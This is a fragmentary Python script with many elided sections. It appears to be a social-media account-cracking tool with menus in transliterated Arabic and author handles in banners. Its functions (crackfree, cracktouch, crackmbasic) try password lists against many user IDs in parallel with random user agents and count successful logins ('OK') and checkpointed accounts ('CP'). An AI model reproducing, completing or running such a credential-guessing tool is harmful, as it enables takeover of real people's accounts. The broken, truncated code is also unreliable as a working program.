#=[ Recode bolehðŸƒ Tapi Sertakan Nama Gua yah ]=#
...
def menu(my_name,my_id):
	...
	os.system('clear')
	banner()
	print(' \033[1;35m[\033[1;32m1\033[1;35m] \033[1;37mSEYD MN MLF  ')
	print(' \033[1;35m[\033[1;32m0\033[1;35m] \033[1;37mT9YIYR LKOKEZ  ')
	print()
	_____DYNO__DYNO_____ = input(' \033[1;35m[\033[1;32m+\033[1;35m] \033[1;37mDIR R9M TB9IH :  ')
	print()
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f' \033[1;35m[\033[1;32m1\033[1;35m] \033[1;37m9ADIM  ')
	print(f' \033[1;35m[\033[1;32m2\033[1;35m] \033[1;37mJEDID  ')
	print(f' \033[1;35m[\033[1;32m3\033[1;35m] \033[1;37m5LA6  ')
	print()
	hu = input(' \033[1;35m[\033[1;32m+\033[1;35m] \033[1;37mDIR R9M Y3JBK : ')
	print()
	if hu in ['1','01']:
	...
	hc = input(' \033[1;35m[\033[1;32m+\033[1;35m] \033[1;37mDIR R9M Y3JBK : ')
	print()
	if hc in ['1','01']:
...
#	elif hc in ['3','03']:
 # 	method.append('touch')
	...
	_jembot_ = input(' \033[1;35m[\033[1;32m+\033[1;35m] \033[1;37mDIR 7RV T (T)  ')
	print()
	if _jembot_ in ['']:
		print(' DIR 7RV ')
		back()
		...
		taplikasi.append('no')
	pwplus=input(' \033[1;35m[\033[1;32m+\033[1;35m] \033[1;37mKOD MN L2DAT DIR T (T)  ')
	os.system('clear')
	banner()
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]-[green] CRACK SEYD LI SDT.....[cyan] =[white] '))
	print(f'[{h}•{h}]{h} OK : {h}%s '%(ok))
	print(f'{m}[{m}•{m}]{m} CP : {m}%s{m} '%(cp))
	print('')
	print(' LAHI T3L SEYD DIR Y ? [ Y == T ] = ')
	woi = input('\x1b[1;95m   DIR 7RV TB9IH = ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}{k}  ')
...
ᴘʏ  ➩ @ABDELLAHI12 | @ddaaddtt'''				
					
				statuscp1 = nel(statuscp, style='white')
				cetak(nel(statuscp1, title='7ISAB 5ASR'))
...
ᴘʏ  ➩ @ABDELLAHI12 | @ddaaddtt'''				
				...
				cetak(nel(statusok1, title='7ISAB SAL7'))
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r   [ 𝐴b𝐷𝐸𝐿𝐿𝐴𝐻𝐼 ]     {P}{b}{loop}{P}  /  {b}{len(id)}{P}  -  𝑂𝐾 - {P}{H}{ok}{P}  -  𝐶𝑃 -{P}{M}{cp}{P}  -  ({bo}{'{:.0%}'.format(loop/float(len(id)))}{asu})  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
...
def cracktouch(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r𝐴b𝐷𝐸𝐿𝐿𝐴𝐻𝐼¬¬ 𝑂𝐾:%s ¬ 𝐶𝑃:%s  %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
